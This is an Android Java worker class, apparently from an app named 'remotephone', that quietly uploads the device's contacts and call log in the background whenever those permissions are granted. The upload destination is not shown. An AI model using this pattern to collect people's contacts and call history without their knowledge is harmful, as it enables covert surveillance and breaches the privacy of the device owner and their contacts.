package com.exemplo.remotephone;

import android.content.Context;
import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import androidx.work.*;
import java.util.concurrent.TimeUnit;

public class SyncWorker extends Worker {
    public SyncWorker(Context c, WorkerParameters p){ super(c,p); }
    @NonNull @Override public Result doWork() {
        Context ctx = getApplicationContext();
        if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CONTACTS)==0)
            UploadHelper.uploadContacts(ctx);
        if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG)==0)
            UploadHelper.uploadCallLog(ctx);
        return Result.success();
    }
}
